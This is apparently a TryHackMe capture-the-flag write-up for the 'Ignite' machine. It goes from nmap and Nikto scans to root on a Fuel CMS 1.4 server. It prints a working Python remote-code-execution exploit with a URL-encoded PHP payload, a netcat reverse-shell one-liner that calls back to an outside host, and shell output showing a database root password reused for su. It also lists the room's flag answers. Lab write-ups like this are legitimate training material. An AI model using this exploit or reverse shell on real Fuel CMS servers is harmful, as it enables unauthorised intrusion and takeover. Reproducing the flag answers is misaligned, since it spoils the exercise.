# Ignite

#### A new start-up has a few issues with their web server.

## Nmap Scan

```
# Nmap 7.60 scan initiated Sat Aug  7 05:56:40 2021 as: nmap -sC -sV -oN nmap.txt 10.10.111.229
Nmap scan report for ip-10-10-111-229.eu-west-1.compute.internal (10.10.111.229)
Host is up (0.0011s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
MAC Address: 02:AA:E5:D2:0B:1D (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  7 05:56:54 2021 -- 1 IP address (1 host up) scanned in 13.95 seconds
```

## Nikto Scan

```
User-agent: *
Disallow: /fuel/

- Nikto v2.1.5/2.1.5
+ Target Host: ip-10-10-111-229.eu-west-1.compute.internal
+ Target Port: 80
+ GET /: The anti-clickjacking X-Frame-Options header is not present.
+ GET /robots.txt: Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x1e 0x58e9ae94570a7
+ GET //fuel/: File/dir '/fuel/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ GET /robots.txt: "robots.txt" contains 1 entry which should be manually viewed.
+ DEBUG HASH(0x564ed52e2e60): DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ -877: TRACK /: HTTP TRACK method is active, suggesting the host is vulnerable to XST
+ -3092: GET /home/: /home/: This might be interesting...
+ -3233: GET /icons/README: /icons/README: Apache default file found.
```

<p>Lets Visit Web Server</p>

![Home Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Ignite/Picture-1.png "Home Page")

<p>There is one entry in Robots.txt</p>

![Robots.txt](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Ignite/Picture-2.png "Robots.txt")

<p>We can See Web Server running on Fuel CMS Version 1.4</p>
<p>Lets Check Any Exploit Available for this Version</p>

![Fuel CMS Exploit](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Ignite/Picture-3.png "Fuel CMS Exploit")

## Fuel CMS Exploit in Python

<p>I am using Python3 So I have made neccessary changes in this Exploit.</p>

<p>If you are using Python2 Change Below Lines</p>

```
import urllib.parse
to
import urllib

filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
to
filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"

```

```
import requests
import urllib.parse

URL = "http://10.10.111.229/"


def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start


while 1:
    xxxx = input('cmd:')
    url = URL+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
    r = requests.get(url)

    html = "<!DOCTYPE html>"
    htmlcharset = r.text.find(html)

    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text,begin,2)

    print(r.text[0:dup])

```

<p> We can also use another Exploit Written in Ruby.</p>

```
https://github.com/noraj/fuelcms-rce/blob/master/exploit.rb
https://github.com/noraj/fuelcms-rce/blob/master/README.md

```

<p>Run the Exploit</p>
<p>Use below Command to Create Reverse Shell using NetCat</p>

```
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.0.212 1337 >/tmp/f
```

```
sam@SOMETHING-PC MINGW32 /
$ ncat -lvnp 1337
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.106.168.
Ncat: Connection from 10.10.106.168:51202.
/bin/sh: 0: can't access tty; job control turned off
$ ls
README.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$

www-data@ubuntu:/var/www/html$ fg
fg
bash: fg: current: no such job

www-data@ubuntu:/var/www/html$ ls -la
ls -la
total 52
drwxrwxrwx 4 root root  4096 Jul 26  2019 .
drwxr-xr-x 3 root root  4096 Jul 26  2019 ..
-rw-r--r-- 1 root root   163 Jul 26  2019 .htaccess
-rwxrwxrwx 1 root root  1427 Jul 26  2019 README.md
drwxrwxrwx 9 root root  4096 Jul 26  2019 assets
-rwxrwxrwx 1 root root   193 Jul 26  2019 composer.json
-rwxrwxrwx 1 root root  6502 Jul 26  2019 contributing.md
drwxrwxrwx 9 root root  4096 Jul 26  2019 fuel
-rwxrwxrwx 1 root root 11802 Jul 26  2019 index.php
-rwxrwxrwx 1 root root    30 Jul 26  2019 robots.txt
www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
www-data

www-data@ubuntu:/home$ cd www-data
cd www-data

www-data@ubuntu:/home/www-data$ ls
ls
flag.txt

www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b

www-data@ubuntu:/home/www-data$

```

<p>Lets find root.txt</p>
<p>In Home Page We can see that Database Config file related information.</p>

![Database Config File](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Ignite/Picture-4.png "Database Config File")

```
www-data@ubuntu:/var/www/html$ find / -type f -name "database.php" 2>/dev/null
/var/www/html/fuel/application/config/database.php
www-data@ubuntu:/var/www/html$

cat /var/www/html/fuel/application/config/database.php

www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php

<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}

```

<p>Use Password <b><i>mememe</i></b></p>

```
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# cd ~
root@ubuntu:~# ls -la
total 32
drwx------  4 root root 4096 Jul 26  2019 .
drwxr-xr-x 24 root root 4096 Jul 26  2019 ..
-rw-------  1 root root  357 Jul 26  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb 26  2019 .cache
drwxr-xr-x  2 root root 4096 Jul 26  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   34 Jul 26  2019 root.txt
root@ubuntu:~# cat root.txt
b9bbcb33e11b80be759c4e844862482d
root@ubuntu:~#

```

## Task 1 Root it

```
User.txt
Ans: 6470e394cbf6dab6a91682cc8585059b

Root.txt
Ans: b9bbcb33e11b80be759c4e844862482d

```
